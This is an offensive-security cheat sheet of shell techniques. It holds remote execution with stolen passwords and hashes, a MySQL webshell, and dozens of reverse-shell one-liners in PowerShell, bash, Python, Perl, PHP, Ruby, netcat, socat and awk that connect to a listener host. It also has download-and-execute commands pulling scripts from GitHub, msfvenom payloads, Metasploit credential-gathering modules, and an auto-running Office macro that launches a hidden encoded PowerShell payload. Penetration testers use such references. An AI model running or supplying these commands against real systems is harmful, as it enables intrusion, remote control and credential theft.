# Shells


## Windows Shell

### SMB

```bash
wmiexec.py <domain>\<user>:<pass>@<target>
winexe -U <domain>/<user>%<pass> //<target> cmd.exe /c dir C:\
pth-winexe -U <user>%<hash> //<target> cmd
impacket-psexec '<user>:<pass>@<target>'
impacket-psexec @targets.txt -u domain\user -p password -s command

crackmapexec smb --exec-method wmiexec <host> -u <user> -d <domain> -H <hash> -x <command>
crackmapexec smb --exec-method smbexec <host_file> -u <user> -d <domain> -H <hash> -x <command>
crackmapexec smb --exec-method atexec <host> -u <user> -d <domain> -H <hash> -x <command>
crackmapexec smb --exec-method mmcexec <host> -u <user> -d <domain> -H <hash> -x <command>

WmiExec.ps1 -ComputerName "<target>" -Command "Get-ChildItem C:\"
```

### WinRM

```bash
gem install evil-winrm
evil-winrm -i <target> -u <user> -p '<pass>'
```

---


## Webshell

### Mysql

```bash
SELECT '<?php passthru($_GET[cmd]);?>' INTO OUTFILE '<file_location>/<filename>'
```

---

## Reverse Shell


### Check outgoing ports 

**Internet**

[portquiz](http://portquiz.net/)

**local** 

```bash
# Generate and execute on target
msfvenom -p windows/meterpreter/reverse_tcp_allports -f exe > test_firewall.exe

# Listen for incoming traffic
tcpdump -ni any host <target>
```
### CMD

```bash
certutil -urlcache -split -f http://<listener_ip>:1234/shell.exe C:\Windows\Temp\shell.exe & start "" C:\Windows\Temp\shell.exe
```

### Powershell

```bash
Invoke-WebRequest -Uri "http://<listener_ip>:1234/nc.exe" -OutFile "nc.exe" & .\nc.exe -e cmd.exe <listener_ip> 1234
echo Invoke-WebRequest -Uri http://<listener_ip>:1234/revshell.exe -Outfile c:\windows\temp\revshell.exe | powershell -noprofile
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<listener_ip>:1234/shell.ps1')|iex"
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<listener_ip>",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<listener_ip>',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')

# Powercat
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

powercat -c <listener_ip> -p 1234 -e cmd.exe

powercat -c <listener_ip> -p 1234 -e cmd.exe -g > reverse.ps1
.\reverse.ps1

powercat -c <listener_ip> -p 1234 -e cmd.exe -ge > reverse
powershell.exe -E -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgA.....
```


### Bash TCP

```bash
bash -i >& /dev/tcp/<listener_ip>/1234 0>&1
0<&196;exec 196<>/dev/tcp/<listener_ip>/4242; sh <&196 >&196 2>&196
exec 5<> /dev/tcp/<listener_ip>/4242; cat <&5 | while read line; do $line 2>&5>&5; done 
```

### Bash UDP

```bash
Victim:
sh -i >& /dev/udp/<listener_ip>/4242 0>&1

Listener:
nc -u -lvp 4242
```

> Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash



### Python

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<listener_ip>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<listener_ip>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

export RHOST="<listener_ip>";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

### Perl

```bash
perl -e 'use Socket;$i="<listener_ip>";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<listener_ip>:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

# NOTE: Windows only
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<listener_ip>:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### PHP

```bash
php -r '$sock=fsockopen("<listener_ip>",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("<listener_ip>",1234);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("<listener_ip>",1234);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("<listener_ip>",1234);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("<listener_ip>",1234);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("<listener_ip>",1234);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("<listener_ip>",1234);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```


### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("<listener_ip>",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<listener_ip>","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# NOTE: Windows only
ruby -rsocket -e 'c=TCPSocket.new("<listener_ip>","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```


### Netcat

```bash
nc -e /bin/sh <listener_ip> 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <listener_ip> 1234 >/tmp/f
```

### Socat

```bash
socat -d -d TCP4-LISTEN:1234 STDOUT
socat TCP4:<listener_ip>:1234 EXEC:/bin/bash

socat TCP4-LISTEN:1234,reuseaddr,fork EXEC:/home/leak
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listener_ip>:1234

socat file:`tty`,raw,echo=0 TCP-L:1234
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listener_ip>:1234


wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listener_ip>:1234
```

### Awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/<listener_ip>/1234"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### War

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<listener_ip> LPORT=1234 -f war > reverse.war
```


---

## Get better BASH shell 

Using socat

```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:1234

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listener_ip>:1234  
```

Using stty

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
ctrl + z
stty raw -echo;fg
reset
```

## File transfer 

### Netcat 

```bash

nc -nlvp 80 > received.txt
nc <ip_adress> 80 < sent.txt 
```
### Socat 

Socat nossl

```bash
socat TCP4-LISTEN:80,fork file:secret_passwords.txt
socat TCP4:<ip_adress>:80 file:received_secret_passwords.txt,create
```

Socat SSL

```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash

socat -OPENSSL:<ip_adress>:443,verify=0
```

### Python HTTP

```bash
python -m SimpleHTTPServer 8080
python3 -m http.server 8080
```

### SMB impacket

```bash
impacket-smbserver -smb2support SHARENAME /tmp/sharename
```

### Powershell

```bash
disable UAC
Set-ExecutionPolicy Unrestricted
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
Invoke-WebRequest -Uri http://<ip_adress>/x.txt -Outfile c:\Windows\Temp\x.txt
```

### Powercat

```bash
nc -lnvp 443 > x.txt
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\x.txt```
```

### SMB impacket

```bash
impacket-smbserver -smb2support SHARENAME /tmp/sharename
```

## Metasploit 

```bash
# Generate shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<listener_ip> LPORT=1234 -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<listener_ip> LPORT=1234 -f exe > reverse.exe
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<listener_ip> LPORT=1234 -f macho > shell.macho
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<listener_ip> LPORT=1234 -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<listener_ip> LPORT=1234 -f war > shell.war
msfvenom -p php/meterpreter_reverse_tcp LHOST=<listener_ip> LPORT=1234 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

# generate handler 
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
jobs -l 
jobs -K 
set ExitOnSession false
set AUTORUNSCRIPT post/windows/manage/migrate
run -j 
makerc /tmp/msf.rc
msfconsole -r /tmp/msf.rc

# Download and execute on target
wget <listener_ip>:1234/shell.elf -O /tmp/shell.elf && chmod 777 /tmp/shell.elf && /tmp/shell.elf &

# Upload, hide and exec from meterpreter
execute -H -i -c -m -d calc.exe -f /tmp/exploit.exe -a '-arg1 -arg2 -arg3'

# Multi post modules 
echo "post/windows/gather/credentials/sso" >> /tmp/multi_post.rc
echo "post/windows/gather/credentials/gpp" >> /tmp/multi_post.rc
use post/multi/manage/multi_post
set MACRO=/tmp/macro.rc
set SESSION 1
run -j
```

## Office Macro 


```bash
# generate using metasploit
msfvenom -p windows/shell_reverse_tcp LHOST="<listener_ip>" LPORT=443 -f hta-psh > revshell.hta

# python split macro

str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
n = 50
for i in range(0, len(str), n):
 print "Str = Str + " + '"' + str[i:i+n] + '"'


# macro 
Sub AutoOpen()
 juan
End Sub

Sub Document_Open()
 juan

End Sub
Sub juan()
 Dim Str As String
 Str = Str + "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZ"
 Str = Str + "QByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA"
 Str = Str + "AAvAE0AVABpAFIAVABEACcAKQApADsA"

 CreateObject("Wscript.Shell").Run Str
End Sub
```